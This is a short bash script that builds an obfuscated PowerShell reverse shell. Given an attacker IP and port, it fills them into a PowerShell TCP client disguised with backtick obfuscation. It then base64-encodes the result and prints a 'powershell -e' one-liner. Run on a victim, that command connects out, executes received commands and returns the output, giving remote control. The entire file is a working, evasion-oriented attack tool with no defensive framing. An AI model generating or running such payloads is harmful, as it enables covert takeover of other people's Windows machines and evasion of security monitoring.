#!/bin/bash

ip=$1
port=${2:-443}

obfuscated_string='$client  = nEW`-obj`eCT Sy`ST`eM.neT.s`OC`K`eT`s`.TcPCLIe`Nt(  "$ip",$port  )  ; $stream  =  $client.GetStream(  )  ; [byte[]]$bytes =   0..65535|%{0} ;while(( $i   =   $stream.Read($bytes, 0, $bytes.Length  )) -ne 0){ ;  $data = ( NeW-o`B`jecT -TypeName S`ySTE`M.text`.As`c`IIENCOdI`NG  ).GetString($bytes,0, $i ) ; $sendback =   (  I`ex $data 2>&1   |   o`U`T-STrINg   ) ;$sendback2  =   $sendback +   "PS "   +   ( P`wD ).Path  + "> " ; $sendbyte   =  ([text.encoding]::ASCII).GetBytes( $sendback2)  ;$stream.Write($sendbyte,0,$sendbyte.Length );$stream.Flush( )} ; $client.Close(   )'

if [ -z "$ip" ]; then
  echo "[!] Use: $0 <ip> [port]"
else
  obfuscated_command=$(echo "$obfuscated_string" | sed "s/\$ip/$ip/" | sed "s/\$port/$port/" | iconv -t UTF-16LE | base64 -w 0)
  echo "powershell -e $obfuscated_command"
fi
